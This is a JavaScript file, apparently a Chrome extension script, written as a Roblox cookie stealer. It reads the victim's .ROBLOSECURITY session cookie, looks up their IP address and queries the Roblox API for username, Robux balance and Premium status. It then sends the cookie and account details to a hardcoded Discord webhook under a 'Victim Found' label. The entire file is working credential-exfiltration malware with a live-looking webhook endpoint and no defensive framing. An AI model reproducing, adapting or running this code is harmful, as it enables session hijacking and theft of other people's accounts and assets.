const WEBHOOK = "https://discord.com/api/webhooks/1275015275460169779/bNru38ZHUOjFhAgcetBeYM6U0Hi-BeUzK7mQv5EEoQRiA_JAoKPojDp77WA3E_EpXbKO";

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }
    
    fetch(WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify({
            "content": null,
            "embeds": [
              {
                "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                "color": null,
                "fields": [
                  {
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                  },
                  {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                  }
                ],
                "author": {
                  "name": "Victim Found: " + ipAddr,
                  "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                "footer": {
                  "text": "daddy hpzeren",
                  "icon_url": "https://i.pinimg.com/originals/80/72/09/807209a27d4946fa4c33fd5d598eba18.gif"
                },
                "thumbnail": {
                  "url": statistics ? statistics.ThumbnailUrl : "https://i.pinimg.com/originals/80/72/09/807209a27d4946fa4c33fd5d598eba18.gif",
                }
              }
            ],
            "username": "Star Loogger",
            "avatar_url": "https://i.pinimg.com/originals/80/72/09/807209a27d4946fa4c33fd5d598eba18.gif",
            "attachments": []
        })
    });
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
